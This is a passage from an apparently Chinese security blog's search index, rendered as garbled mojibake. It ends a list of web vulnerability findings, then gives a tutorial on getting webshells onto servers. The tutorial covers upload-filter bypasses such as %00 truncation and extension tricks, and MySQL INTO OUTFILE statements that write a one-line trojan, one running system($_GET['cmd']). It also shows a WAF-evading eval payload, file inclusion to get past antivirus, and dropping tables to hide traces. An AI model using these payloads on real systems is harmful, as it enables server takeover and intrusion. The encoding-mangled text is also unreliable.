æˆç”¨æˆ·å¯ä»¥ç›´æ¥æµè§ˆWebç½‘ç«™ç›®å½•ï¼Œå¦‚å›¾ç‰‡ç›®å½•images,javascriptç›®å½•js,ä¸åŒçš„ç›®å½•æ½œåœ¨çš„å±é™©æ˜¯ä¸åŒçš„ã€‚æ”»å‡»è€…ä¸€èˆ¬åˆ©ç”¨å¸¸è§ç›®å½•ä¸­å¯èƒ½åŒ…å«çš„æ•æ„Ÿæ–‡ä»¶è·å–æ•æ„Ÿä¿¡æ¯ã€‚ éªŒè¯æ–¹æ³•è¯´æ˜ï¼šç›´æ¥åœ¨ç«ç‹æµè§ˆå™¨æ‰“å¼€ç›®å½•æµè§ˆé¡µé¢ï¼Œçœ‹æ˜¯å¦å­˜åœ¨åˆ—ç›®å½•ã€‚ 17. URLè·³è½¬æ¼æ´ ç»ç¡®è®¤ï¼Œå­˜åœ¨Struts 2 URLè·³è½¬æ¼æ´ï¼Œå¯¼è‡´ç½‘ç«™çš„æ¶æ„è·³è½¬ã€‚ 18. æ¡†æ¶é’“é±¼æ¼æ´ ç½‘ç«™åº”ç”¨ç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥çš„å±é™©å­—ç¬¦è¿›è¡Œæœ‰æ•ˆæ£€éªŒï¼Œå¯¼è‡´å­˜åœ¨å¯æ³¨å…¥frameæˆ–iframeæ ‡è®°ï¼Œä»è€ŒåµŒå…¥å¯è¿›è¡Œè¯±éª—æ”»å‡»çš„æ¶æ„ç½‘ç«™åœ°å€ã€‚ 19 .ç‚¹å‡»åŠ«æŒ åº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œæœ‰æ•ˆçš„è¿‡æ»¤æˆ–è½¬æ¢ï¼Œæ”»å‡»è€…å¯å‘WEBé¡µé¢é‡Œæ’å…¥å¯¹ç»ˆç«¯ç”¨æˆ·é€ æˆå½±å“æˆ–æŸå¤±çš„æ¶æ„é“¾æ¥ã€‚ 20. HTTPæŠ¥å¤´è¿½è¸ªæ¼æ´ ç›®æ ‡ç½‘ç«™æ”¯æŒTRACE/TRACK WEBæœåŠ¡å™¨HTTPè¿æ¥æ–¹å¼è°ƒèŠ‚åŠŸèƒ½ã€‚å½“è¯¥è°ƒè¯•åŠŸèƒ½å¼€å¯æ—¶ï¼ŒåŒ…å«æ•æ„Ÿä¿¡æ¯çš„HTTPæŠ¥å¤´å¯èƒ½è¢«æ”»å‡»è€…è¿½è¸ªæˆªè·ã€‚ç»æ£€æµ‹å‘ç°è¯¥ç½‘ç«™å­˜åœ¨HTTPæŠ¥å¤´åè®®è¿½è¸ªæ¼æ´ã€‚ æ¼æ´å±å®³ï¼š æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œé€šè¿‡æ„é€ æ¶æ„Scriptè„šæœ¬è¿½è¸ªHTTPæŠ¥å¤´ï¼Œå¯èƒ½è·å–HTTPæŠ¥å¤´ä¸­åŒ…å«çš„æ•æ„Ÿèµ„è®¯ï¼Œå¦‚ Cookieæˆ–è®¤è¯è¯ä¹¦ç­‰ã€‚ 21. DNSåŸŸä¼ é€æ¼æ´ æ£€æµ‹å‘ç°ç›®æ ‡ç³»ç»Ÿå­˜åœ¨é…ç½®ç¼ºé™·ï¼Œæ”»å‡»è€…å¯é€šè¿‡è¯·æ±‚åŸŸä¼ é€æ“ä½œï¼Œè·å–ç½‘ç«™åŸŸå†…çš„è¯¦ç»†ä¿¡æ¯ã€‚ 22.ç§æœ‰IPæ³„éœ² æ£€æµ‹å‘ç°ç›®æ ‡ç½‘ç«™æœªå¯¹é¡µé¢ä¿¡æ¯è¿›è¡Œæœ‰æ•ˆå®‰å…¨è¿‡æ»¤ï¼Œé€šè¿‡è¯·æ±‚å’Œå“åº”æ•°æ®åŒ…å‘ç°å†…éƒ¨ç§æœ‰IPæ•æ„Ÿä¿¡æ¯ã€‚ 23. ç½‘ç»œç‰©ç†è·¯å¾„ä¿¡æ¯æ³„æ¼æ¼æ´ 24. ç³»ç»Ÿé‡è£…æ¼æ´ æ˜“å•†å®â€CMSå­˜åœ¨ç³»ç»Ÿé‡è£…æ¼æ´ï¼Œé€šè¿‡æ­¤æ¼æ´å¯é‡æ–°å®‰è£…è¯¥CMSï¼Œå¹¶å–å¾—ç½‘ç«™çš„ç®¡ç†å‘˜æƒé™ã€‚ä¸ºä¸å½±å“ç½‘ç«™çš„æ­£å¸¸è¿è¡Œï¼Œæœªè¿›è¡Œæ¼æ´å®é™…éªŒè¯ã€‚ 25. ä»»æ„æ–‡ä»¶ä¸‹è½½ å‘ä»¥ä¸ŠURLæäº¤ä»»æ„å·²çŸ¥æ–‡ä»¶åå¯ä»¥ä¸‹è½½åˆ°æ–‡ä»¶å†…å®¹ï¼Œå¯¼è‡´ç½‘ç«™æ•æ„Ÿæ–‡ä»¶è¢«ä¸‹è½½ã€‚","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"è„šæœ¬åé—¨åˆ†æ","slug":"è„šæœ¬åé—¨åˆ†æ","date":"2019-11-12T09:06:58.000Z","updated":"2020-09-20T08:55:35.619Z","comments":true,"path":"2019/11/12/è„šæœ¬åé—¨åˆ†æ/","link":"","permalink":"https://zhangyanlady.github.io/2019/11/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/","excerpt":"","text":"æ€»ç»“å›¾ âœ¨è·å–webshellä¸»è¦åˆ†ä¸¤å¤§ç±»ï¼š ä¸€ã€cmsè·å–webshell äºŒã€écmsè·å–webshell ğŸ§¨ä»€ä¹ˆæ˜¯CMS CMSç³»ç»ŸæŒ‡çš„æ˜¯å†…å®¹ç®¡ç†ç³»ç»Ÿã€‚å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰æ˜¯å…è®¸ç”¨æˆ·å°†å†…å®¹ç›´æ¥å‘å¸ƒåˆ°Webçš„æ¥å£ã€‚å°†å†…å®¹é¡µé¢ç›´æ¥æ·»åŠ åˆ°Webçš„è¿‡ç¨‹æ¯”ä»æœ¬åœ°è®¡ç®—æœºåˆ›å»ºå’Œä¸Šè½½é¡µé¢æå‰ä¸€æ­¥ï¼Œå› ä¸ºå®ƒå…è®¸å¤§é‡äººå‘˜è¿œç¨‹æ·»åŠ å’Œå…±äº«æ•°æ®ã€‚ é€šä¿—æ¥è®²ï¼šCMSå¯ä»¥ç†è§£ä¸ºCMSå¸®ä½ æŠŠä¸€ä¸ªç½‘ç«™çš„ç¨‹åºéƒ¨åˆ†çš„äº‹å…¨åšå®Œäº†ï¼›ä½ è¦åšçš„åªæ˜¯ä¸€ä¸ªç½‘ç«™é‡Œé¢ç¾å·¥çš„éƒ¨ä»½ ğŸƒä¸€ã€cmsè·å–webshellæˆ‘ä»¬æ‰“å¼€ä¸€ä¸ªç½‘ç«™çš„æ—¶å€™åˆ©ç”¨wappalyzeræ’ä»¶å¯ä»¥çœ‹åˆ°ç½‘ç«™çš„cmsæŒ‡çº¹ä¿¡æ¯ç„¶åæˆ‘ä»¬å¯ä»¥ç™¾åº¦è·å–webshellæ–¹æ³•ï¼Œå› ä¸ºè¿™äº›éƒ½æ˜¯å…¬å¼€çš„ è·å–cmsæ–¹æ³• è¿›å…¥åå°ä¹‹åå¯ä»¥æŸ¥çœ‹æŸ¥çœ‹CMSç³»ç»Ÿæœ‰å¯èƒ½ç›´æ¥æ˜¾ç¤ºæœ‰å¯èƒ½ä¼šåœ¨æœ€ä¸‹æ–¹ä¿¡æ¯ä¸­æ˜¾ç¤ºæœ‰å¯èƒ½è¦ä½¿ç”¨å·¥å…·å¾¡å‰‘webæŒ‡çº¹è¯†åˆ«è°·æ­Œæµè§ˆå™¨çš„wappalyzer ğŸ‡äºŒã€écmsè·å–webshellå½“ç½‘ç«™æ²¡æœ‰ç”¨å¼€æºçš„cmsï¼Œæˆ–è€…ä½¿ç”¨è‡ªå·±å¼€å‘çš„cmsï¼Œæˆ‘ä»¬å¦‚ä½•è·å–webshellå‘¢ï¼Ÿé¦–å…ˆåˆ†ä¸¤ç§æƒ…å†µæœ‰ç®¡ç†æƒé™ï¼ˆç™»å½•åå°ï¼‰ã€å’Œæ— ç®¡ç†æƒé™ï¼ˆæ²¡æœ‰ç™»å½•åå°ï¼‰ã€‚ ğŸ«æœ‰ç®¡ç†æƒé™ä¸‹ç›´æ¥ä¸Šä¼ ç½‘ç«™å¯¹ä¸Šä¼ æ–‡ä»¶åç¼€æ ¼å¼å¹¶æœªè¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼ WebShellå³å¯ å¤§æ¦‚æ€è·¯æ˜¯ï¼Œå·²çŸ¥åå°ç®¡ç†å‘˜è´¦å·å’Œå¯†ç ï¼Œæ‰¾æœ‰ä¸Šä¼ èŠ‚ç‚¹çš„åœ°æ–¹ï¼Œå†™ä¸€ä¸ªéšè”½æˆ–å˜å½¢çš„æœ¨é©¬ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸåï¼Œç”¨èœåˆ€æˆ–èšå‰‘è¿æ¥ã€‚ æ·»åŠ åç¼€ç±»å‹ä¸Šä¼ æ³¨ï¼šä¸ºä»€ä¹ˆè¦å†™ä¸€ä¸ªéšè”½æˆ–å˜å½¢çš„æœ¨é©¬å‘¢ï¼Ÿå› ä¸ºå¦‚æœä½ ç”¨çš„å¸¸è§çš„æœ¨é©¬ï¼Œåªè¦ä¸€ä¸Šä¼ å°±ä¼šè¢«ç®¡ç†å‘˜æˆ–WAFå‘ç°ï¼ˆå¸¸è§çš„æœ¨é©¬WAFéƒ½æ˜¯æœ‰æ”¶é›†çš„ï¼Œæ‰€ä»¥å¯ä»¥å†™å®Œæœ¨é©¬ä¹‹åç”¨Dç›¾æ£€æŸ¥ä¸€ä¸‹ï¼Œè¢«WAFæ£€æµ‹å‡ºæ¥çš„å±é™©ç­‰çº§æ˜¯å¤šå°‘ï¼‰ 2.æ•°æ®åº“å¤‡ä»½ä¸æ¢å¤æŠŠå…è®¸ä¸Šä¼ çš„æ ¼å¼çš„æœ¨é©¬ï¼Œå¤‡ä»½æˆ–è€…æ¢å¤æˆæœ¨é©¬æ ¼å¼ ç½‘ç«™å¯¹ä¸Šä¼ çš„æ–‡ä»¶åç¼€è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸ä¸Šä¼ è„šæœ¬ç±»å‹æ–‡ä»¶å¦‚ aspã€phpã€jspã€aspxç­‰ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å·¥å…·è®²ä¸€å¥è¯æœ¨é©¬æ’å…¥å›¾ç‰‡ä¸­è€Œç½‘ç«™å…·æœ‰æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥å°†WebShellæ ¼å¼å…ˆæ”¹ä¸ºå…è®¸ä¸Šä¼ çš„æ–‡ä»¶æ ¼å¼ï¼Œç„¶åï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸Šä¼ åçš„æ–‡ä»¶è·¯å¾„ï¼Œé€šè¿‡æ•°æ®åº“å¤‡ä»½ï¼Œå°†æ–‡ä»¶å¤‡ä»½ä¸ºè„šæœ¬æ ¼å¼ã€‚ 1ï¼‰æœ‰äº›å¤‡ä»½æ•°æ®åº“çš„åœ°æ–¹ï¼Œé™åˆ¶äº†ç”¨æˆ·æ›´æ”¹è·¯å¾„ï¼Œé‚£è¯¥æ€ä¹ˆåŠï¼Ÿ F12æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œä¿®æ”¹æ–‡æœ¬æ¡†å…ƒç´ çš„valueå€¼ä¸ºæˆ‘ä»¬æƒ³è¦çš„è·¯å¾„æˆ–æ ¼å¼å°±å¯ä»¥å®Œæˆä¿®æ”¹ 2ï¼‰å¦‚æœä¸Šä¼ çš„æ ¼å¼è¢«é™åˆ¶å‘¢ï¼Ÿè¯¥æ€ä¹ˆåŠï¼Ÿ å¯ä»¥ä½¿ç”¨%00æˆªæ–­æ¥ç»•è¿‡ä¸Šä¼ é™åˆ¶æˆ–ä½¿ç”¨BurpSuite å·¥å…·ï¼ˆ%00æˆªæ–­ã€ç‰¹æ®Šåæ–‡ä»¶åç»•è¿‡ã€æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ç­‰ç­‰é»‘ç™½åå•ç»•è¿‡ï¼‰ä¹‹å‰è®²è¿‡ 3.æœ¬åœ°jséªŒè¯çªç ´æ‹¿WebShellå½“ç½‘ç«™è®¾ç½®äº†jsæ¥é™åˆ¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹æ—¶ï¼Œå¯ä»¥é€šè¿‡åˆ é™¤jséªŒè¯æˆ–è€…ä¿®æ”¹ä¸Šä¼ ç±»å‹çªç ´ä¸Šä¼ æ‹¿WebShellã€‚ï¼ˆè¿™ç§æ–¹æ³•ä¹‹å‰è®²è¿‡ï¼Œå°è±¡å¾ˆæ·±ï¼Œæœ€è¿‘æœ‰ä¸€ç¯‡ç»•è¿‡IWRITEå†™ä½œå¹³å°é˜²å¤åˆ¶ç²˜è´´å†…ä¸ªåŠŸèƒ½å°±æ˜¯åˆ©ç”¨çš„è¿™ä¸ªæ–¹æ³•ï¼‰ æˆ–è€…ä½¿ç”¨BurpSuite æˆ–è€…æ˜¯ Fiddleç­‰ä»£ç†å·¥å…·æäº¤ï¼Œæœ¬åœ°æ–‡ä»¶å…ˆæ›´æ”¹ä¸ºjpgï¼Œä¸Šä¼ æ—¶æ‹¦æˆªï¼Œå†æŠŠæ–‡ä»¶æ‰©å±•åæ›´æ”¹ä¸ºaspæˆ–è€…phpå³å¯ 4ã€ä¸Šä¼ å…¶å®ƒè„šæœ¬ç±»å‹æ‹¿WebShell1ï¼‰æ­¤ç±»å‹ç”¨äºä¸€å°æœåŠ¡å™¨å…·æœ‰å¤šä¸ªç½‘ç«™ï¼Œaç½‘ç«™æ˜¯aspçš„ç«™ï¼Œbå¯èƒ½æ˜¯phpçš„ç«™ï¼Œè€Œaç«™ä¸­é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶ç±»å‹ä¸ºaspçš„æ–‡ä»¶ï¼Œä½ å¯ä»¥å°è¯•ä¸Šä¼ phpçš„è„šæœ¬ï¼Œæ¥æ‹¿Shell 2ï¼‰ä½ ä¹Ÿå¯ä»¥å°è¯•å°†è„šæœ¬æ–‡ä»¶åç¼€åæ”¹ä¸ºasa æˆ–è€…åœ¨åé¢ç›´æ¥åŠ ä¸ªç‚¹ï¼ˆ.ï¼‰å¦‚â€xx.asp.â€ æ¥çªç ´æ–‡ä»¶ç±»å‹é™åˆ¶è¿›è¡Œä¸Šä¼ æ‹¿WebShell è¿™ä¸ªæ€è·¯è¿˜æ˜¯å¤´ä¸€æ¬¡è§å™¢ï¼Œæœ‰ç”¨çš„æ€è·¯å¢åŠ äº†ï¼ 5ã€%00æˆªæ–­æ‹¿WebShellå¾ˆä¼ ç»Ÿäº†ä¸å¤šè¯´ æˆªæ–­ä¸Šä¼ %00æˆªæ–­ç‰¹æ®Šæ–‡ä»¶å 1ï¼‰åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œä½ ä¸Šä¼ çš„æ–‡ä»¶åå¯èƒ½ä¼šè¢«ç½‘ç«™è‡ªåŠ¨æ”¹æˆåˆ«çš„åå­—ï¼Œè¿™ä¸ªæ—¶å€™ä½ å¯ä»¥å°è¯•æŠ“å–ä¸Šä¼ æ–‡ä»¶æ•°æ®åŒ…ï¼Œå°†æ–‡ä»¶åæ”¹ä¸ºxx.asp%00.jpgè¿›è¡Œæˆªæ–­ä¸Šä¼ ï¼Œæ‹¿WebShell 6ã€åˆ©ç”¨è§£ææ¼æ´æ‹¿WebShellå¯ä»¥çœ‹ä¸­é—´ä»¶æ¼æ´é‚£ä¸ªæ ç›® ä¸ªäººè®¤ä¸ºè®°ä½å‡ ä¸ªå¸¸è§çš„å°±å¥½äº†å§ï¼Œä¸€èˆ¬éƒ½æ˜¯ä¼šæŸ¥ä¸€éçš„ï¼Œè¿™å¤§ä¾¿å®œä¸æ¡ç™½ä¸æ¡ 1ï¼‰IIS5.x / 6.0 è§£ææ¼æ´2ï¼‰IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 ç•¸å½¢è§£ææ¼æ´3ï¼‰Nginx &lt; 8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´ç•¸å½¢è§£ææ¼æ´4ï¼‰Apache è§£ææ¼æ´ï¼ˆç”±äºApacheæ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æçš„ï¼Œå¦‚æœä¸å¯è¯†åˆ«è§£æï¼Œå°±å†å¾€å·¦åˆ¤æ–­ï¼‰ 7ã€åˆ©ç”¨ç¼–è¾‘å™¨æ¼æ´æ‹¿WebShellåŒä¸­é—´ä»¶ å¸¸è§ç¼–è¾‘å™¨ fckeditorewebeditorcheditor 8ã€ç½‘ç«™é…ç½®æ’é©¬æ‹¿WebShellé€šè¿‡æ‰¾åˆ°ç½‘ç«™é»˜è®¤é…ç½®ï¼Œå°†ä¸€å¥è¯æ’å…¥åˆ°ç½‘ç«™é…ç½®ä¸­ï¼Œä¸è¿‡ä¸ºäº†èƒ½å¤ŸæˆåŠŸæ‰§è¡Œæ’é©¬ï¼Œå»ºè®®å…ˆä¸‹è½½è¯¥ç«™æºç ï¼Œè¿›è¡ŒæŸ¥çœ‹æºç è¿‡æ»¤è§„åˆ™ï¼Œä»¥é˜²æ’é©¬å¤±è´¥ã€‚ PSï¼šæ’é©¬å¤±è´¥å¾ˆæœ‰å¯èƒ½ä¼šå¯¼è‡´ç½‘ç«™è¢«ä½ å†™çš„ä¸€å¥è¯æœ¨é©¬ï¼Œæ²¡æœ‰é—­åˆæ ‡ç­¾å¯¼è‡´è¢«ç½‘ç«™è¢«æ’åºŸã€‚ æ•°æ®åº“é…ç½®æ–‡ä»¶æ’é©¬ä¹Ÿæ˜¯ç›¸åŒçš„ å¾€é…ç½®æ–‡ä»¶å†™å…¥æœ¨é©¬å°±å¯ä»¥äº† ä¸å¤ªæ¸…æ¥šè¿™ä¸ªæ’åºŸæ˜¯å•¥æƒ…å†µï¼Œæ²¡é‡åˆ°è¿‡ï¼Œæ ¹æ®ä¸åŒæƒ…å†µï¼Œç¼–å†™ä¸åŒä»£ç ï¼Œéœ€è¦ä¸€å®šèƒ½åŠ›å™¢ 9ã€é€šè¿‡ç¼–è¾‘æ¨¡å—æ‹¿WebShell1ï¼‰é€šè¿‡å¯¹ç½‘ç«™çš„æ¨¡å—è¿›è¡Œç¼–è¾‘å†™å…¥ä¸€å¥è¯ï¼Œç„¶åç”Ÿæˆè„šæœ¬æ–‡ä»¶æ‹¿WebShell 2ï¼‰é€šè¿‡å°†æœ¨é©¬æ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶ï¼ŒæŠŠåå­—æ”¹ä¸ºç½‘ç«™æ¨¡æ¿ç±»å‹ï¼Œä¸Šä¼ åˆ°ç½‘ç«™æœåŠ¡å™¨ï¼Œæ‹¿WebShell 10ã€ä¿®æ”¹è„šæœ¬ç›´æ¥æ‹¿WebShellæœ‰çš„ç½‘ç«™å¯ä»¥ä¿®æ”¹æ·»åŠ è„šæœ¬æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥æ‹¿WebShell 11ã€SQLå‘½ä»¤è·å–è¿™ä¸ªç®—ä»Šå¤©å°è±¡æœ€æ·±åˆ»çš„äº† å¯ä»¥é€šè¿‡phpmyadmin ç™»å½•æ•°æ®åº“ä½¿ç”¨æ•°æ®åº“å‘½ä»¤æ¥å†™å¦‚ä¸€å¥è¯æ‹¿WebShell æ³¨ï¼šè¿™ä¸ªå‰ææ¡ä»¶æ˜¯éœ€è¦æœ‰ä¸€å®šçš„æ•°æ®åº“æƒé™ å¤§è‡´æ­¥éª¤ï¼š åˆ›å»ºè¡¨ å°†ä¸€å¥è¯å†™å…¥åˆšåˆ›å»ºçš„è¡¨ä¸­ æŸ¥è¯¢ä¸€å¥è¯æ‰€åœ¨è¡¨åˆ°æ–‡ä»¶ï¼ŒæˆåŠŸå°†ä¸€å¥è¯å†™å…¥æ–‡ä»¶ å…·ä½“æ“ä½œ ç¬¬ä¸€ç§ 12345671 CREATE TABLE &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; TEXT NOT NULL );2 INSERT INTO &#96;mysql&#96;.&#96;best&#96; (&#96;best1&#96; ) VALUES (&#39;&#39;);3 SELECT &#96;best1&#96; FROM &#96;best&#96; INTO OUTFILE &#39;d:&#x2F;wamp&#x2F;www&#x2F;best.php&#39;;4 DROP TABLE IF EXISTS &#96;best&#96;; å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°mysqlåº“bestè¡¨best1å­—æ®µ æŸ¥è¯¢è¿™ä¸ªå­—æ®µå¯¼å‡ºåˆ°ç½‘ç«™çš„æ–‡ä»¶ä¸­ æŠŠç—•è¿¹æ¸…é™¤ ç¬¬äºŒç§æ–¹æ³• 12345671 Create TABLE moon(best text NOT NULL);2 Insert INTO moon(best)VALUES(&#39;&#39;);3 selectbest from moon into outfile&#39;d:&#x2F;wamp&#x2F;www&#x2F;best2.php&#39;;4ã€ Drop TABLE IF EXISTS moon; ç¬¬ä¸‰ç§æ–¹æ³•ï¼š 11ã€select&#39;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best3.php&#39; ä¼˜å…ˆæ¨èä¸ä½†ç®€å•æ˜äº†ï¼Œè€Œä¸”é¿å…äº†è¯¯åˆ åˆ«äººçš„æ•°æ®ï¼ ç¬¬å››ç§æ–¹æ³• 1231 select&#39;\\&#39;;system($_GET[\\&#39;cmd\\&#39;]); echo \\&#39;\\&#39;; 2 ?&gt;&#39;INTO OUTFILE&#39;d:&#x2F;wamp&#x2F;www&#x2F;best4.php&#39; 12ã€ä¸Šä¼ ç‰¹æ®Šæœ¨é©¬æ‹¿WebShellä¸€äº›ç½‘ç«™å®‰è£…äº†WAF å®‰å…¨ç‹—ã€360ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€äº›å…æ€é©¬ï¼Œå˜å½¢æœ¨é©¬æ¥è¿›è¡Œçªç ´å°æ€ä¾‹å¦‚ï¼šâ€œ%&gt;&lt;%eval request(â€œSkull.â€)%&gt;&lt;%â€™â€ 13ã€æ–‡ä»¶åŒ…å«æ‹¿WebShellå…ˆå°†WebShell æ”¹ä¸ºtxtæ ¼å¼æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªè„šæœ¬æ–‡ä»¶åŒ…å«è¯¥txtæ ¼å¼æ–‡ä»¶ï¼Œå¯ç»•è¿‡WAFæ‹¿WebShell è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ï¼Œæˆ‘ä»¬å·²ç»é€šè¿‡èœåˆ€æ‹¿ä¸‹äº†æƒé™äº†ï¼Œå‡è®¾èœåˆ€ä¸€å¥è¯æœ¨é©¬å¯ä»¥è¿‡å®‰å…¨ç‹—ï¼Œä½†å¤§é©¬å´æ€ä¹ˆéƒ½æ²¡æœ‰ä¸Šä¼ æˆåŠŸï¼Œç»•è¿‡å®‰å…¨ç‹— è§£å†³å‘ç°å¤§é©¬ä¸Šä¼ ä¸äº†ï¼Œè¢«é˜²ç«å¢™æˆ–è€…å®‰å…¨ç‹—æ‹¦æˆªæ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨åŒ…å«æ–‡ä»¶ æ€è·¯ 1ï¼‰å…ˆä¸Šä¼ ä¸€ä¸ªå«æœ‰åŒ…å«ä»£ç ï¼ˆå¦‚ï¼‰å´æ²¡æœ‰æ”»å‡»ä»£ç çš„æ–‡ä»¶ï¼Œä¸ä¼šè¢«ç‹—æ‹¦ 2ï¼‰å†å°†å¤§é©¬æ”¹æˆjpgå›¾ç‰‡æ–‡ä»¶ä¸Šä¼ ï¼Œä¹Ÿä¸ä¼šè¢«ç‹—æ‹¦ 3ï¼‰è®¿é—®ç¬¬ä¸€æ¬¡ä¸Šä¼ çš„åŒ…å«å‡½æ•°çš„æ–‡ä»¶ï¼Œä¼šå‘ç°æ‰§è¡Œäº†æœ¨é©¬ 4ï¼‰è¿™é‡Œæ˜¯å› ä¸ºåŒ…å«å‡½æ•°åŒ…å«çš„æ–‡ä»¶ä¼šè¢«å½“æˆè„šæœ¬æ–‡ä»¶ï¼Œç›´æ¥å°†æ–‡ä»¶å†…å®¹æ’å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ éç®¡ç†æƒé™ï¼ˆä¸ç™»å½•åå°ï¼‰1ã€SQLæ³¨å…¥æ¼æ´æœ‰é«˜æƒé™ æœ‰ç»å¯¹è·¯å¾„å¯ä»¥ç›´æ¥å†™ å‰ææ¡ä»¶ï¼Œå…·æœ‰è¶³å¤Ÿæƒé™ï¼Œå¯¹å†™å…¥æœ¨é©¬çš„æ–‡ä»¶å¤¹æœ‰å†™å…¥æƒé™ï¼ŒçŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ 1.å¯¹äºMsSQL æ³¨å…¥æ¼æ´ç½‘ç«™å¯ä»¥é€šè¿‡log å¤‡ä»½ã€å·®å¼‚å¤‡ä»½æ‹¿WebShell 2.å¯¹äºMySQL æ³¨å…¥æ¼æ´çš„ç½‘ç«™å¯ä»¥é€šè¿‡into outfile å‡½æ•°(å†™å…¥å‡½æ•°)å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥ï¼Œæ‹¿WebShellã€‚è¦æœ‰file_privæƒé™ \\2. çŸ¥é“æ–‡ä»¶ç»å¯¹è·¯å¾„ \\3. èƒ½ä½¿ç”¨union \\4. å¯¹webç›®å½•æœ‰è¯»æƒé™ æ³¨ï¼šè‹¥è¿‡æ»¤äº†å•å¼•å·ï¼Œåˆ™å¯ä»¥å°†å‡½æ•°ä¸­çš„å­—ç¬¦è¿›è¡Œhexç¼–ç è¿˜æœ‰ä¸€ä¸ªæ˜¯into file å‡½æ•°ï¼ˆè¯»å–å‡½æ•°ï¼‰# into outfile å‡½æ•°ç±»ä¼¼ ä¹‹å3.åˆ©ç”¨phpmyadmin å°†æœ¨é©¬å¯¼å‡ºï¼Œæ‹¿WebShell 4.åˆ©ç”¨è¿æ¥å¤–è¿çš„æ•°æ®åº“æ‹¿WebShell 2ã€ä¿®æ”¹ç½‘ç«™ä¸Šä¼ ç±»å‹é…ç½®æ¥æ‹¿WebShellæŸäº›ç½‘ç«™ï¼Œåœ¨ç½‘ç«™ä¸Šä¼ ç±»å‹ä¸­é™åˆ¶äº†ä¸Šä¼ è„šæœ¬ç±»å‹æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å»æ·»åŠ ä¸Šä¼ æ–‡ä»¶ç±»å‹å¦‚æ·»åŠ asp | php | jsp | aspx | asa åç¼€åæ¥æ‹¿WebShell 3ã€xsså’Œsqlæ³¨å…¥è”åˆåˆ©ç”¨æœ‰äº›è¾“å…¥æ¡†å¯¹ä¸€äº›ç¬¦å·è¿‡æ»¤ä¸ä¸¥å¯†ï¼ˆå¦‚&lt;&gt;ï¼Œæ‰€ä»¥ä¸€èˆ¬å­˜åœ¨xssçš„åœ°æ–¹å°±å¯ä»¥è¿™ä¹ˆåˆ©ç”¨ï¼‰æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œè¾“å…¥ä¸€å¥è¯ä¹‹åå†ç”¨æ•°æ®åº“æ³¨å…¥ï¼ŒæŸ¥è¯¢åˆ°æ–‡ä»¶into fileæˆåŠŸæ’å…¥ä¸€å¥è¯æœ¨é©¬ 4ã€IISå†™æƒé™æ‹¿WebShellæœ‰äº›ç½‘ç«™çš„ç®¡ç†å‘˜åœ¨é…ç½®ç½‘ç«™æƒé™çš„æ—¶å€™ç–å¿½ï¼Œå¯¼è‡´æˆ‘ä»¬æœ‰å†™æƒé™ï¼Œè¿™ç§æ¼æ´éœ€è¦ç”¨å·¥å…·æ¥åˆ©ç”¨ï¼Œåœ¨è¿™é‡Œå°±ä¸è¯´äº†ï¼Œåªæ˜¯æä¸€ä¸‹ã€‚è€Œä¸”å·²ç»å¾ˆå°‘è§äº†ï¼Œæœ‰ä¸“é—¨çš„åˆ©ç”¨å·¥å…·ï¼ˆæ¡‚æ—è€å…µï¼‰ï¼ŒåŸç†æ˜¯é€šè¿‡æ‰¾åˆ°æœ‰IIS å†™å…¥æƒé™çš„ç½‘ç«™ï¼ˆå¼€å¯WebDeVï¼‰ï¼ŒPUTè¿›å»ä¸€ä¸ª.txt æ ¼å¼çš„æ–‡ä»¶ï¼Œç›®å½•å¿…é¡»æœ‰åˆ»å†™çš„æƒé™ï¼Œå¦‚ image æ–‡ä»¶å¤¹ï¼Œç„¶åé€šè¿‡move 